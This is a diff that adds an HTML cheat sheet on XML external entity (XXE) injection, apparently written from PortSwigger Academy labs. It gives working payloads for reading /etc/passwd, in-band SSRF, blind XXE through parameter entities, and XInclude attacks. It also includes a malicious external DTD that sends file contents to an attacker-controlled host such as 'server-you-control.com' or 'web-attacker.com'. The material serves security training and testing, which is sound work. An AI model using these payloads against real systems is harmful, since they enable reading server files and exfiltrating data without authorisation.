@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>XXE</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="xxe-injection">XXE Injection</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for XXE</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><p>https://portswigger.net/web-security/xxe</p></li>
+<li><p>https://www.youtube.com/watch?v=gjm6VHZa_8s</p></li>
+<li><p>https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</p></li>
+<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection</p></li>
+</ul>
+<p><br></p>
+<h2 id="recon">Recon</h2>
+<h3 id="how-to-find-and-test-for-xxe-vulnerabilities">How to find and
+test for XXE vulnerabilities</h3>
+<ul>
+<li><p>https://www.bugcrowd.com/blog/how-to-find-xxe-bugs/</p></li>
+<li><p>Manually testing for XXE vulnerabilities generally involves:</p>
+<ul>
+<li><p>Testing for file retrieval by defining an external entity based
+on a well-known operating system file and using that entity in data that
+is returned in the application’s response.</p></li>
+<li><p>Testing for blind XXE vulnerabilities by defining an external
+entity based on a URL to a system that you control, and monitoring for
+interactions with that system. Burp Collaborator client is perfect for
+this purpose.</p></li>
+<li><p>Testing for vulnerable inclusion of user-supplied non-XML data
+within a server-side XML document by using an XInclude attack to try to
+retrieve a well-known operating system file.</p></li>
+<li><p>If the application is allowing to upload files with a svg, xml,
+xlsx extension or any other file formats that either use or contain XML
+subcomponents, try injecting an appropriate XXE payload.</p></li>
+<li><p>Modify the content type of the requests to XML type and see if
+the application still processes the modified data correctly. If it does
+try injecting a XXE payload.</p></li>
+</ul></li>
+<li><p>https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-vulnerabilities</p></li>
+</ul>
+<p><br></p>
+<hr />
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><strong>If the application <u>is returning</u> the values of the
+defined external entities in its response, we can try the following
+techniques:</strong></p>
+<p><br></p>
+<h3 id="file-retrieval">File Retrieval</h3>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;file:///etc/passwd&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span></code></pre></div>
+<ul>
+<li>Then use the defined xxe entity in an xml value in the request:</li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dv">&amp;xxe;</span></span></code></pre></div>
+<ul>
+<li>We may be able to see the contents of the /etc/passwd file in the
+response.</li>
+</ul>
+<p><br></p>
+<h3 id="in-band-ssrf">In-band SSRF</h3>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://internal.vulnerable-website.com/&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span></code></pre></div>
+<ul>
+<li>Then use the defined xxe entity in an xml value in the request:</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dv">&amp;xxe;</span></span></code></pre></div>
+<ul>
+<li>We may be able to see the HTTP response returned from the internal
+website.</li>
+</ul>
+<p><br><br></p>
+<h3 id="example-xxe-injection-attack">Example: XXE Injection Attack</h3>
+<ul>
+<li><p>The XML value in &lt;productId&gt; is being reflected in the
+response when an error is triggered so this was a good target for
+in-band XXE injection.</p></li>
+<li><p>The below is an example payload for XXE injection:</p></li>
+</ul>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/XXE%20Injection/Images/XXE-1.png"
+alt="XXE Injection" />
+<figcaption aria-hidden="true">XXE Injection</figcaption>
+</figure>
+<p><br><br><br></p>
+<p><strong>If the application <u>is not returning</u> the values of the
+defined external entities in its response, we need to use Blind Payload
+Techniques:</strong></p>
+<h3 id="blind-xxe-to-a-server-you-control">Blind XXE to a server you
+control</h3>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> <span class="dt">xxe</span> SYSTEM <span class="st">&quot;http://server-you-control.com&quot;</span><span class="dt">&gt;</span> <span class="dt">]&gt;</span></span></code></pre></div>
+<ul>
+<li>Then use the defined xxe entity in an xml value in the request:</li>
+</ul>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dv">&amp;xxe;</span></span></code></pre></div>
+<ul>
+<li>Check your server logs for any network traffic.</li>
+</ul>
+<p><br></p>
+<h3
+id="blind-xxe-to-a-server-you-control-when-regular-external-entities-are-blocked-use-parameter-entities">Blind
+XXE to a server you control, when regular external entities are blocked
+(use parameter entities):</h3>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[</span> <span class="dt">&lt;!ENTITY</span> % xxe SYSTEM <span class="st">&quot;http://server-you-control.com&quot;</span><span class="dt">&gt;</span> <span class="dv">%xxe;</span> <span class="dt">]&gt;</span></span></code></pre></div>
+<ul>
+<li><p>Here the xxe parameter entity needs to be referenced “within” the
+DOCTYPE.</p></li>
+<li><p>Check your server logs for any network traffic.</p></li>
+</ul>
+<p><br><br></p>
+<h3 id="example-xxe-injection-parameter-entities">Example: XXE Injection
+Parameter Entities</h3>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/XXE%20Injection/Images/XXE-2.png"
+alt="XXE Injection2" />
+<figcaption aria-hidden="true">XXE Injection2</figcaption>
+</figure>
+<p><br><br></p>
+<h3 id="blind-xxe-to-exfiltrate-data-malicious-external-dtd">Blind XXE
+to exfiltrate data – malicious external DTD</h3>
+<ul>
+<li><p>Host the following code in a .dtd file on your server: (Change
+the targeted file as needed.)</p></li>
+<li><p>This will cause the application to issue a request to the
+attacker’s server, appending the contents of the /etc/passwd file as a
+query parameter.</p></li>
+</ul>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % eval &quot;<span class="er">&lt;</span>!ENTITY <span class="dv">&amp;#x25;</span> exfiltrate SYSTEM &#39;http://server-you-control.com/?x=%file;&#39;&gt;&quot;&gt;</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>%eval;</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>%exfiltrate;</span></code></pre></div>
+<ul>
+<li>Now inject the following payload in the body of the request on the
+target application: (Note: The file on your server needs to be called
+“malicious.dtd”)</li>
+</ul>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[&lt;!ENTITY</span> % xxe SYSTEM <span class="st">&quot;http://server-you-control.com/malicious.dtd&quot;</span><span class="dt">&gt;</span> <span class="dv">%xxe;</span><span class="dt">]&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3
+id="blind-xxe-to-exfiltrate-data-external-dtd-via-error-messages">Blind
+XXE to exfiltrate data – external DTD via error messages</h3>
+<ul>
+<li>Host the following code in a .dtd file on your server, the
+“nonexistent” file will cause an error message, and the stack trace will
+include the contents of the /etc/passwd in the HTTP response of the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>!ENTITY % eval &quot;<span class="er">&lt;</span>!ENTITY <span class="dv">&amp;#x25;</span> error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&quot;&gt;</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>%eval;</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>%error;</span></code></pre></div>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application: (Note: The file on your server needs to be called
+“malicious.dtd”)</li>
+</ul>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">foo</span> <span class="dt">[&lt;!ENTITY</span> % xxe SYSTEM <span class="st">&quot;http://web-attacker.com/malicious.dtd&quot;</span><span class="dt">&gt;</span> <span class="dv">%xxe;</span><span class="dt">]&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="blind-xxe-repurpose-a-local-dtd">Blind XXE – repurpose a local
+DTD</h3>
+<ul>
+<li>https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd</li>
+</ul>
+<p><br></p>
+<h3 id="hidden-attack-surface-xinclude-attacks">Hidden Attack Surface –
+XInclude Attacks</h3>
+<ul>
+<li>Inject the following payload in the body of the request on the
+target application:</li>
+</ul>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span><span class="ot"> xmlns:xi=</span><span class="st">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">xi:include</span><span class="ot"> parse=</span><span class="st">&quot;text&quot;</span><span class="ot"> href=</span><span class="st">&quot;file:///etc/passwd&quot;</span>/&gt;&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+<ul>
+<li>Payload Example: (URL encoding is required on appropriate characters
+to work properly in POST request.)</li>
+</ul>
+<pre><code>productId=1&lt;foo+xmlns%3axi%3d&quot;http%3a//www.w3.org/2001/XInclude&quot;&gt;&lt;xi%3ainclude+parse%3d&quot;text&quot;+href%3d&quot;file%3a///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1</code></pre>
+<p><br></p>
+<h3 id="hidden-attack-surface-file-upload">Hidden Attack Surface – File
+Upload</h3>
+<ul>
+<li><p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-in-exotic-files</p></li>
+<li><p>https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload</p></li>
+<li><p>To identify this vulnerability:</p>
+<ul>
+<li><p>Set the file extension to .svg</p></li>
+<li><p>Include a &lt;svg&gt; parameter in the request body where the
+file’s contents go</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h3 id="change-content-type-of-request">Change Content Type of
+Request</h3>
+<ul>
+<li><p>Change the content type and body of the request to XML type and
+analyze if the application still processes the request correctly. If it
+does, then we can try XXE payloads.</p>
+<ul>
+<li>Example: foo=bar</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span><span class="ot"> version=</span><span class="st">&quot;1.0&quot;</span><span class="ot"> encoding=</span><span class="st">&quot;UTF-8&quot;</span><span class="fu">?&gt;</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">foo</span>&gt;bar&lt;/<span class="kw">foo</span>&gt;</span></code></pre></div>
+<p><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet.</li>
+</ul>
+</body>
+</html>
